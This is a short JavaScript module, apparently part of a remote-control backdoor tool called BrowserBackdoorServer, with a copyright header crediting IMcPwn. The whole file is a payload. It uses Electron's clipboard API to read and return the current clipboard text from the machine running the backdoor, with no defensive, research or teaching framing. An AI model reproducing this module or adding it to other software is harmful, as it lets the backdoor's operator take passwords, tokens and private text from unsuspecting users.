/*
 * Copyright (c) 2016 Carleton Stuberg - http://imcpwn.com
 * BrowserBackdoorServer by IMcPwn.
 * See the file 'LICENSE' for copying permission
 *
 * Info: Gets current clipboard text.
 * Parameters: None
 * Returns: Text in clipboard
 * Author: IMcPwn
 */

if (typeof electron === typeof undefined) electron = require('electron');

return electron.clipboard.readText();
